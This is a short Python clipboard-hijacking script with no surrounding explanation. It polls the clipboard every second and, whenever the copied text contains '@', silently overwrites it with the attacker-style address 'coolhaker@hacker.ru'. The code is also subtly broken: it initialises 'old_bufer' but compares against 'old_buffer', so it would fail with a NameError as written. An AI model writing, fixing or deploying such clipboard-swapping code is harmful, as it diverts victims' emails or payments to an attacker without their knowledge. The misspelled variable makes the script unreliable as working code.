import pyperclip
import time

old_bufer = ''
while True:
    buffer = pyperclip.paste()
    if buffer != old_buffer:
        print(buffer)
        old_bufer = buffer
        if "@" in buffer:
            pyperclip.copy('coolhaker@hacker.ru')
    time.sleep(1)